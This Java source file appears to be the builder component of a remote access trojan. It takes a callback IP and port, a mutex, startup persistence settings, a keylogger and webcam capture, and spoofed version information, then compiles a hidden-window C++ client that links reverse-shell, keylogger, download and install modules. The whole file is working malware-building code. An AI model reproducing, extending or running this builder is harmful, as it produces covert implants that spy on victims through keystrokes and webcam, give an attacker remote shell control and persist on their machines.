package GUI.Compiler;

import javax.swing.*;
import javax.swing.filechooser.FileNameExtensionFilter;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;

public class Compiler implements ActionListener {

    private final JDialog compilerDialog;
    private final JCheckBox[] checkBoxes;
    private final JTextField[] fieldsArray;
    private final ButtonGroup buttonGroup;


    public Compiler(JDialog compilerDialog, JCheckBox[] checkBoxesArray, JTextField[] fieldsArray, ButtonGroup buttonGroup) {
        this.compilerDialog = compilerDialog;
        this.checkBoxes = checkBoxesArray;
        this.fieldsArray = fieldsArray;
        this.buttonGroup = buttonGroup;
    }

    // Creating command line for compiling with g++, several options to include on the client
    @Override
    public void actionPerformed(ActionEvent e) {
        // File chooser where to save file
        final StringBuilder command = new StringBuilder();
        JFileChooser chooser = new JFileChooser();
        chooser.setFileFilter(new FileNameExtensionFilter(".exe", "."));
        chooser.setCurrentDirectory(new File(System.getProperty("user.dir")));
        chooser.setSelectedFile(new File("client"));
        chooser.setAcceptAllFileFilterUsed(false);
        int returnVal = chooser.showSaveDialog(compilerDialog);
        CPPModifier modifier = new CPPModifier("../jcClient/client.cpp");
        if (returnVal == JFileChooser.APPROVE_OPTION) {
            setAssemblySettings();
            // Set IP
            modifier.setIP(fieldsArray[0].getText());
            // Set PORT
            modifier.setPORT(fieldsArray[1].getText());
            // Set tag name
            modifier.setTagName(fieldsArray[2].getText());
            // Set mutex
            modifier.setMutex(fieldsArray[3].getText());
            // Set timing
            modifier.setTimingRetry(fieldsArray[4].getText());
            // Create command line
            command.append(fieldsArray[5].getText()).append(" compile_configuration/compiled_assembly.opc client.cpp " +
                    "video_audio/DeviceEnumerator.cpp " +
                    "stream/Stream.cpp  " +
                    "time/Time.cpp  converter/Converter.cpp " +
                    "download/Download.cpp " +
                    "file/FileManager.cpp  " +
                    "information/system/SystemInformation.cpp  " +
                    "information/network/NetworkInformation.cpp " +
                    "reverse_shell/ReverseShell.cpp " +
                    "keyboard/KeyboardExecuter.cpp " +
                    "keylogger/KeyLogger.cpp " +
                    "permission/Permission.cpp " +
                    "box_message/MessageBoxGUI.cpp " +
                    "state/SystemState.cpp " +
                    "install/Install.cpp ");
            if (checkBoxes[0].isSelected()) {
                modifier.setInstallationPath(buttonGroup.getSelection().getActionCommand());
                modifier.setSubdirectoryName(fieldsArray[6].getText());
                modifier.setSubdirectoryFileName(fieldsArray[7].getText() + ".exe");
                modifier.setStartUpName("STARTUP_NAME", checkBoxes[1].isSelected() ? "\""+fieldsArray[8].getText()+"\"" : "");
            } else {
                modifier.setInstallationPath("(-1)");
            }
            if (checkBoxes[2].isSelected()) {
                modifier.addInclude("#define WEBCAM");
                modifier.setStartUpName("WEBCAM","\""+fieldsArray[9].getText()+"\"");
                command.append(
                        "screen/ScreenStreamer.cpp " +
                                "webcam/WebcamManager.cpp " +
                                " -IC:opencv_static/include -Lopencv_static/lib " +
                                "-lopencv_gapi460 -lopencv_highgui460 " +
                                "-lopencv_ml460 -lopencv_objdetect460 " +
                                "-lopencv_photo460 -lopencv_stitching460 " +
                                "-lopencv_video460 -lopencv_calib3d460 " +
                                "-lopencv_features2d460 -lopencv_dnn460 " +
                                "-lopencv_flann460 -lopencv_videoio460 " +
                                "-lopencv_imgcodecs460 -lopencv_imgproc460 " +
                                "-lopencv_core460 -llibprotobuf " +
                                "-lade -llibjpeg-turbo -llibwebp " +
                                "-llibpng -llibtiff -llibopenjp2 -lIlmImf " +
                                "-lzlib -lquirc ");
            } else modifier.removeInclude("#define WEBCAM");
            command.append("-lwsock32 -lcomctl32 -lgdi32 " +
                    "-lole32 -lsetupapi -lws2_32  -loleaut32 -luuid" +
                    " -lcomdlg32 -lwininet -static-libgcc " +
                    "-static-libstdc++ -Wl,-Bstatic -lstdc++ -lpthread -Wl,-Bdynamic -mwindows -o ").append(
                    chooser.getSelectedFile().getAbsolutePath());

            if (checkBoxes[3].isSelected()){
                modifier.addInclude("#define KEYLOGGER");
                modifier.setStartUpName("KEYLOGGER","\""+fieldsArray[10].getText()+"\"");
            } else modifier.removeInclude("#define KEYLOGGER");
            modifier.writeToFile();
            System.out.println(command);
            compile(command.toString());
        }

    }

    // Thread for compiling the project opening shell in client project directory
    private void compile(String command) {
        new Thread(() -> {
            ProcessBuilder assemblyProcess = new ProcessBuilder();
            assemblyProcess.command("cmd.exe", "/c", "windres assembly.rc compiled_assembly.opc").directory(new File("../jcClient/compile_configuration/"));
            executeProcess(assemblyProcess);

            ProcessBuilder compileProcess = new ProcessBuilder();
            compileProcess.command("cmd.exe", "/c", command).directory(new File("../jcClient"));
            executeProcess(compileProcess);
        }).start();
    }

    private void executeProcess(ProcessBuilder processBuilder){
        try {
            Process process = processBuilder.start();
            StringBuilder output = new StringBuilder();
            BufferedReader reader = new BufferedReader(
                    new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            int exitVal = process.waitFor();
            if (exitVal != 0) {
                JOptionPane.showMessageDialog(compilerDialog,
                        "Error compiling client, check your compiler and try again.",
                        "Error compiling", JOptionPane.ERROR_MESSAGE);
            } else System.out.println("Compiled successfully");
            System.out.println(output);

        } catch (IOException | InterruptedException ex) {
            ex.printStackTrace();
        }

    }

    private void setAssemblySettings(){
        CPPModifier modifier = new CPPModifier("../jcClient/compile_configuration/assembly.rc");
        modifier.modifyAssemblySettings(
                fieldsArray[11].getText(),
                fieldsArray[12].getText(),
                fieldsArray[13].getText(),
                fieldsArray[14].getText(),
                fieldsArray[15].getText(),
                fieldsArray[16].getText());
        modifier.writeToFile();
    }



}
